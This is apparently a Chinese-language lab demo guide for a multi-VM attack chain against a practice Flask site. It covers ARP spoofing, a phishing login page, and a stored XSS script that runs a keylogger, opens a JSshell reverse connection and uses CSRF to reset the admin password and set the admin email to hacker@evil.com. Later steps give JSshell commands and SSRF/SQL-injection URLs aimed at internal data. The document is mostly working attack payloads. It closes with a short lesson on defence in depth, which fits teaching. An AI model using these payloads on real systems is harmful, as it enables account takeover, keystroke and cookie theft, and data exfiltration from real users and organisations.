=== 完整攻擊演示流程 ===

## 環境設置 (多台虛擬機)

### VM1 (Kali - 攻擊者)
1. 啟動攻擊者伺服器
   cd c:\Users\Alan\Desktop\coding\python\hacker_final\attacker_server
   python app.py

2. 啟動 JSshell
   cd c:\Users\Alan\Desktop\coding\python\hacker_final\attacker_server\JSshell-master
   python jsh.py -g

3. 🎯 **新功能！動態控制面板**: http://127.0.0.1:8888/admin
   - 即時統計數據更新
   - 美觀的駭客風格界面
   - 自動刷新功能 (每3秒)
   - 快捷鍵支援 (Ctrl+Space 暫停/恢復, Ctrl+R 手動刷新)

### VM2 (內部伺服器)
1. 啟動外部 Flask
   cd c:\Users\Alan\Desktop\coding\python\hacker_final\web_server
   python app.py

2. 啟動內部 Flask
   cd c:\Users\Alan\Desktop\coding\python\hacker_final\internal_server
   python app.py

### VM3, VM4 (受害者 - Windows)
- 正常訪問網站的用戶

## 🚀 增強的攻擊演示流程

### Step 1: 啟動動態監控
1. 打開攻擊者控制面板: http://127.0.0.1:8888/admin
2. 觀察即時統計：
   - 竊取的帳密數量
   - Keylogger 記錄數量
   - 總按鍵數統計
   - 伺服器狀態

### Step 2: ARP Spoofing + 即時監控
```bash
# 在 VM1 (Kali) 執行
arpspoof -i eth0 -t VM3_IP VM2_IP
```
- 控制面板會即時顯示伺服器狀態
- 準備監控受害者連接

### Step 3: 偽造登入頁面攻擊
- VM3 訪問 http://VM2_IP:5000/login
- 實際被導向 http://VM1_IP:8888/login
- VM3 輸入帳密: test/testpass
- 📊 **控制面板即時更新**：
  - "Stolen Credentials" 計數器 +1
  - 新的帳密記錄即時出現
  - IP、時間戳、User Agent 詳細信息

### Step 4: 使用竊取帳密登入真實伺服器
- 在控制面板查看竊取的帳密
- 使用 test/testpass 登入 http://VM2_IP:5000
- 成功進入後台系統

### Step 5: 🎯 **針對 Admin 的 CSRF 攻擊**
在留言板注入專門針對admin的惡意載荷：
```html
<script>
// 檢查當前用戶是否為 admin
if(document.querySelector('.nav-content') && document.querySelector('.nav-content').innerText.includes('admin')) {
    
    console.log('[ATTACK] Admin detected - Starting targeted attack');
    
    // JSshell 反向連接 (僅針對 admin)
    setInterval(function(){
        with(document)body.appendChild(createElement("script")).src="http://127.0.0.1:4848/?admin_".concat(document.cookie)
    }, 1010);
    
    // 針對 admin 的 CSRF 攻擊 - 修改密碼為 hacked123
    setTimeout(() => {
        // 多種方式獲取 CSRF token
        let token = null;
        
        // 方法1: 從隱藏的 input 獲取
        const hiddenToken = document.querySelector('#csrf_token_hidden');
        if (hiddenToken) {
            token = hiddenToken.value;
            console.log('[ATTACK] Token from hidden input:', token);
        }
        
        // 方法2: 從任何 csrf_token input 獲取
        if (!token) {
            const tokenInput = document.querySelector('input[name="csrf_token"]');
            if (tokenInput) {
                token = tokenInput.value;
                console.log('[ATTACK] Token from form input:', token);
            }
        }
        
        // 方法3: 先訪問 /account 頁面獲取 token
        if (!token) {
            fetch('/account')
                .then(response => response.text())
                .then(html => {
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(html, 'text/html');
                    const tokenInput = doc.querySelector('input[name="csrf_token"]');
                    if (tokenInput) {
                        token = tokenInput.value;
                        console.log('[ATTACK] Token from /account page:', token);
                        executeCSRFAttack(token);
                    }
                });
        } else {
            executeCSRFAttack(token);
        }
        
        function executeCSRFAttack(csrfToken) {
            if (!csrfToken) {
                console.log('[ATTACK] No CSRF token found!');
                return;
            }
            
            console.log('[ATTACK] Executing CSRF attack with token:', csrfToken);
            
            fetch('/account', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: `csrf_token=${csrfToken}&new_password=hacked123&email=hacker@evil.com`
            }).then(response => {
                if (response.ok) {
                    console.log('[ATTACK] Admin password changed to hacked123');
                    // 通知攻擊者伺服器攻擊成功
                    new Image().src = 'http://127.0.0.1:8888/keylogger?admin_pwned=success';
                } else {
                    console.log('[ATTACK] CSRF attack failed:', response.status);
                }
            }).catch(e => {
                console.log('[ATTACK] CSRF attack error:', e);
            });
        }
        
    }, 3000);
    
    // 針對 admin 的 Keylogger
    let adminKeys='';
    document.addEventListener('keydown',e=>{
        adminKeys+=e.key;
        if(adminKeys.length>=5){
            new Image().src='http://127.0.0.1:8888/keylogger?admin_keys='+encodeURIComponent(adminKeys);
            adminKeys='';
        }
    });
    
} else {
    // 針對普通用戶的 Keylogger (較簡單)
    let keys='';
    document.addEventListener('keydown',e=>{
        keys+=e.key;
        if(keys.length>=8){
            new Image().src='http://127.0.0.1:8888/keylogger?keys='+encodeURIComponent(keys);
            keys='';
        }
    });
}
</script>
```

### Step 6: 等待 Admin 觸發攻擊
- Admin 登入系統: admin/adminpass
- 訪問留言板查看留言  
- 🎯 **控制面板即時更新**：
  - "CSRF Attacks" 計數器 +1
  - 顯示 admin 密碼從 adminpass 改为 hacked123
  - Admin 的 JSshell 連接建立
  - Admin 的按鍵開始被記錄

### Step 7: 驗證攻擊成功
1. Admin 登出
2. 嘗試用原密碼登入: admin/adminpass ❌ 失敗
3. 使用新密碼登入: admin/hacked123 ✅ 成功
4. 攻擊者成功獲得 Admin 權限！

### Step 8: JSshell 控制 Admin
在 VM1 的 JSshell terminal：
```javascript
// 測試 Admin 連接
alert('Admin 瀏覽器已被控制!')

// 獲取 Admin 的所有 Cookie
prompt('Admin Cookies:', document.cookie)

// 重定向 Admin 到攻擊者控制面板
document.location = 'http://127.0.0.1:8888/admin'

// 在 Admin 瀏覽器中執行管理員操作
fetch('/admin/users').then(r=>r.text()).then(data=>console.log(data))
```

### Step 9: 🎯 **SSRF 攻擊演示**
⚠️ **重要：SSRF 功能現在僅限 admin 使用**

1. **權限檢查**
   ```
   普通用戶訪問 /fetch 會被拒絕
   只有 admin 可以使用此功能
   ```

2. **獲得 Admin 權限後使用 SSRF**
   ```
   使用竊取的 admin 帳密 (admin/hacked123) 登入
   或者等待 CSRF 攻擊成功修改密碼後登入
   ```

3. **發現 SSRF 端點**
   ```
   Admin 登入後訪問: http://127.0.0.1:5000/fetch
   發現管理員專用的 URL 獲取工具
   ```

4. **探測內部服務**
   ```
   http://127.0.0.1:5000/fetch?path=http://127.0.0.1:8080/
   發現內部管理系統運行在 8080 端口
   ```

5. **竊取敏感資料**
   ```
   員工資料: /fetch?path=http://127.0.0.1:8080/employees
   財務資料: /fetch?path=http://127.0.0.1:8080/financial  
   系統日誌: /fetch?path=http://127.0.0.1:8080/logs
   ```

6. **SQL Injection via SSRF**
   ```
   /fetch?path=http://127.0.0.1:8080/sql_debug?query=SELECT * FROM employees WHERE salary > 1000000
   /fetch?path=http://127.0.0.1:8080/sql_debug?query=SELECT * FROM financial_data WHERE amount > 10000000
   /fetch?path=http://127.0.0.1:8080/sql_debug?query=SELECT name,salary,email FROM employees ORDER BY salary DESC
   ```

7. **外部探測測試**
   ```
   /fetch?path=http://httpbin.org/ip
   /fetch?path=http://httpbin.org/headers
   ```

## 🎯 攻击链的重要性

### 權限提升的關鍵性
1. **第一階段**: 竊取普通用戶帳密 (釣魚攻擊)
2. **第二階段**: 利用 XSS + CSRF 獲得 admin 權限
3. **第三階段**: 使用 admin 權限進行 SSRF 攻擊
4. **最終階段**: 透過 SSRF 訪問內部敏感系統

### 演示重點
- ✅ **權限控制**: 展示功能限制的重要性
- ✅ **攻擊鏈**: 展示多個漏洞的組合利用
- ✅ **橫向移動**: 從外部網站攻擊內部系統
- ✅ **數據洩露**: 獲取敏感的員工和財務資料

## 🔒 防護機制展示

### SSRF 防護
- ✅ 權限控制：只有 admin 可以使用
- ❌ 仍然存在 SSRF 漏洞，可訪問內部服務
- ❌ 沒有白名單限制可訪問的 URL

### 攻擊成功的條件
- 需要先獲得 admin 權限 (透過 CSRF 攻擊)
- admin 權限是 SSRF 攻擊的前提
- 展示了縱深防禦的重要性

這種設計展示了即使有部分防護措施，攻擊鏈仍然可能成功！
